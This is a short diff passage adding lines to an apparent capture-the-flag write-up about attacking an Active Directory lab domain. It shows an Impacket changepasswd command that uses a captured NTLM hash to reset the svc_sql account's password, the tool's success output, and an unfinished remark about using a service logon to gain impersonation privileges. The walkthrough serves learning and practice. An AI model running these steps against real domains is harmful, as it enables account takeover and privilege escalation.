@@ -674,3 +674,14 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 ```
 
 Now i have the NTLM and a TGT for the user, so now i should be able to change the password for the user
+
+```python
+changepasswd.py -hashes :816ccb849956b531db139346751db65f -newpass 'Password123!' darkzero.ext/svc_sql@dc02.darkzero.ext
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Changing the password of darkzero.ext\svc_sql
+[*] Connecting to DCE/RPC as darkzero.ext\svc_sql
+[*] Password was changed successfully.
+```
+
+Now the password is changed i can use the credentials to login with login type 5 (service logon) which should give me SeImp
